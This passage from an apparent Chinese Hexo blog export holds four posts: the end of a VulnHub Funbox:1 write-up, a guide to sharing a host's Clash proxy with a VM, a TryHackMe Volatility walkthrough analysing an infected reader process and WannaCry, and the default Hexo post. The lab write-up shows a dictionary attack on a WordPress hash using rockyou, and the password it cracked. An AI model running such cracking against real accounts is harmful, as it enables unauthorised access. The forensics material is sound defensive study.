--wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>pass.txt</code> 将要破解的hash值写入一个文本文件</li><li><code>--wordlist=</code> 指定密码字典为kali共享目录下的rockyou字典<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/820ac9f18fdb94c6a0373.png"></p></blockquote></li></ul><p>爆破出来后我们可以看到是<code>iubire</code>，拿去登录看看</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/90b8aaa87687692b46389.png"></p></blockquote><p>成功登录后我们可以试着看能不能用wp的漏洞去getshell，但是很显然在这里应该是拿不到root权限的，最多拿一个普通shell，或者说普通shell都拿不到<br>具体咋样还有待后续的尝试<br><em>待续</em></p><h1 id="📖-推荐文章"><a href="#📖-推荐文章" class="headerlink" title="📖 推荐文章"></a>📖 推荐文章</h1><p>国外大佬关于funbox:1的wp:<a href="https://tiagotavares.io/2020/08/funbox-1-vulnhub/#-foothold">funbox:1</a><br>rbash逃逸的方法:<a href="https://xz.aliyun.com/t/7642">rbash逃逸</a><br>funbox:1靶机下载地址:<a href="https://www.vulnhub.com/entry/funbox-1,518/">下载</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux使用clash简便方法</title>
    <link href="/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/"/>
    <url>/Linux%E4%BD%BF%E7%94%A8clash%E7%AE%80%E4%BE%BF%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="如何超级简单的使用魔法，在你的虚拟机中？"><a href="#如何超级简单的使用魔法，在你的虚拟机中？" class="headerlink" title="如何超级简单的使用魔法，在你的虚拟机中？"></a>如何超级简单的使用魔法，在你的虚拟机中？</h2><p>平时在虚拟机中总会遇到用魔法的时候，但是有这么几个问题？</p><ul><li>linux 不同于 windows，操作安装都简单（大佬略过），我们在 linux 上安装 v2ray 或者 clash 都会可能时不时遇到报错，又或者配置错误</li><li>可能会有很多太虚拟机，每台虚拟机都配置一下岂不是很烦？</li><li>有的魔法会限制设备数，虚拟机和本机是算一个还是多个（这个我不知道，存疑）</li></ul><p>诸如以上的问题，那要如何方便的使用魔法，只需俩步：</p><h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>在 windows 的 clash 客户端中开启 Allow Lan 选项，如图</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bd6da1cfa43536515211b.png"><br>此时记住我们的端口号</p></blockquote><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>打开我们的虚拟机的设置，按以下步骤设置</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f04002b20e7398c81cd1f.png"></p></blockquote><h4 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h4><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/2a6c3590350c838c1c0a3.png"></p></blockquote><p>此时我们在终端和浏览器中都可以访问外网了<br>这样我们 git 也快很多，也不必换源了。<br>v2ray 的话没有去试过，因为之前 v2ray 的订阅过期了，但是 v2ray 里有个相同的设置，按道理应该也可以</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/05b311eecc4013f3b4d68.png"></p></blockquote><h4 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h4><ul><li>一般物理机 ip 分配的不会变，但是如果虚拟机不能施展魔法了，请查看物理机 ip 是否改变</li><li>虚拟机和物理机要在同一个局域网中，建议使用虚拟机中的桥接模式，然后在网络设置中选择和物理机同一张网卡</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>我之前是用的 ubuntu23 版本，然后在网上换了个阿里云的源，后面下载 ssh 服务和其他东西的的时候一直报错安装不了</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/21e0106f6e08af927e5f7.png"></p></blockquote><p>当时一直问 gpt，然后没解决，后面百度了” g++ : 依赖: cpp (= 4:9.3.0-1ubuntu2) 但是 4:12.2.0-3ubuntu1 正要被安装”才知道是因为源的问题，然后我又换回原来的源</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>clash</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>clash</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme房间volatility 取证</title>
    <link href="/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/"/>
    <url>/tryhackme%E6%88%BF%E9%97%B4volatility%20%E5%8F%96%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h1 id="题目-1"><a href="#题目-1" class="headerlink" title="题目 1"></a>题目 1</h1><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d981f70b0a96644b8e338.png"><br>已知信息：由 abode 文档感染而来,还有一个 ip</p><ul><li>第一问和第二问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9d6cec469ce44083152b8.png"><br>就是求主机信息，根据前面的教程，我们用 windows.info 插件就可以</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.info<br></code></pre></td></tr></table></figure><blockquote><p>此处-f 指定镜像内存文件</p></blockquote><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f88bf187bdfe43fc9e5f.png"></p></blockquote><ul><li>第三问 <u><br>What process can be considered suspicious in Case 001?</u><br>哪个是可疑进程，用 windows.pslist 求出进程列表就行，如果没发现，就用 windows.psscan，可以看隐藏的进程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pslist<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8247d4d481636428691fb.png"><br>根据之前给的提示，就是这个 reader_sl.exe 进程，把这个的信息交上去即可</p></blockquote><ul><li>第 456 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f6c9f21cc546bbae1434c.png"><br>就是求父进程信息，可疑进程 pid，父进程 pid，我们用 windows.pstree</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem windows.pstree<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1c317d503bcf162f98fb3.png"></p></blockquote><ul><li>第七八问<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/0b839dc4d4b38ec6bdd8c.png"><br>求 user-agent 以及一个银行也没有关系，这个时候就要查一个具体的进程内容了<br>这个时候，可以用 windows.memmap.Memmap 插件看内存信息，然后–dump 给保存下来</p></blockquote></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump1.vmem -o /tmp/ windows.memmap.Memmap --pid 1640 --dump<br></code></pre></td></tr></table></figure><blockquote><p>-o 指定输出路径，–pid 指定进程 pid，–dump 保存进程信息<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/19fd7393ac32f675d98a3.png"><br>这是正常的输出<br>然后用 strings 命令打印输出</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i user-agent<br></code></pre></td></tr></table></figure><blockquote><p>grep -i 忽略大小写<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/30ca5f8ebcb96c431b47e.png"></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings /tmp/*.dmp | grep -i chase<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/663d31ed91db660eb3c19.png"><br>看到输出了和 chase 有关的网站，那就是有关了</p></blockquote><h1 id="题目-2"><a href="#题目-2" class="headerlink" title="题目 2"></a>题目 2</h1><p>题目内容是中了勒索病毒</p><ul><li>第一问<br>求可疑进程，用 windows.pslist 即可，然后就可以看见大名鼎鼎的@WanaDecryptor@<br>可以看出来和 wannacry 有关，pid 为 740</li></ul><ul><li>第 2345 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f3961a062c95d11f65ebf.png"><br>父进程可以用 windows.pstree 求出来<br>完整路径可以用 windows.dlllist</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist | grep @WanaDecryptor@.exe<br></code></pre></td></tr></table></figure><blockquote><p>此处也可以用–pid 指定进程，然后可以看见第一个出来的就是他的完整路径<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/904ac9588136018c151ab.png"><br>至于第 5 问，把可疑进程名字放到浏览器一搜就可以看见大名鼎鼎的 Wannacry 病毒</p></blockquote><ul><li>第 6 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/654189c4a023ad21740a0.png"><br>问 decryptor 加载了什么 dll 去创建 socket，之前可以知道 decryptor 就是 taskche.exe，pid 为 1940<br>先用 windows.dlllist 求出所有的 dll</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.dlllist --pid 1940 | grep .dll<br></code></pre></td></tr></table></figure><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/8f04e5642bdf1d58bbbf2.png"><br>然后把所有信息复制下来去问 gpt，让他讲解这里面的 dll 都是什么功能<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5792ece2faae0c83e681d.png"></p></blockquote><ul><li>第 7 问<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7ffdc296bcca2c1db8119.png"><br>哪些互斥体(mutex)可以看出是恶意软件<br>想知道 mutex 是什么可以去问 gpt<br>这个时候我们就需要用到 windows.handles，这个插件可以列出一个进程的所有句柄<br>那么，句柄（handles）又是什么呢？</li></ul><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ce4809f4968ba0365d65b.png">可以参考这个，学过操作系统的应该都可以明白</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./vol.py -f ../dump/dump2.raw windows.handles --pid 1940<br></code></pre></td></tr></table></figure><p>现在来看看输出</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1cefe6ad7f8b049e31e29.png"><br>现在不明白的都可以看到了，至于哪个是答案，可以从搜索引擎得到答案，搜索引擎很重要</p></blockquote><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Wannacry mutant</span><br></code></pre></td></tr></table></figure><p>这样搜即可</p><ul><li>最后一问，这个我也不会，没搞明白，也是通过看提示 windows.filescan，这就是答案</li></ul><h1 id="推荐文章视频"><a href="#推荐文章视频" class="headerlink" title="推荐文章视频"></a>推荐文章视频</h1><p>大神做这个房间的时候的视频（youtube）：<a href="https://www.youtube.com/watch?v=2DZqg2rcYTk">volatility 视频</a><br>有关 Wannacry 的文章，在这里面可以找到有关哪个 mutant 和 dll 的讲解：<a href="https://www.mandiant.com/resources/blog/wannacry-malware-profile">WannaCry Malware Profile</a></p>]]></content>
    
    
    <categories>
      
      <category>tryhackme</category>
      
      <category>取证</category>
      
      <category>volatility</category>
      
    </categories>
    
    
    <tags>
      
      <tag>volatility</tag>
      
      <tag>tryhackme</tag>
      
      <tag>取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/hello-world/"/>
    <url>/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
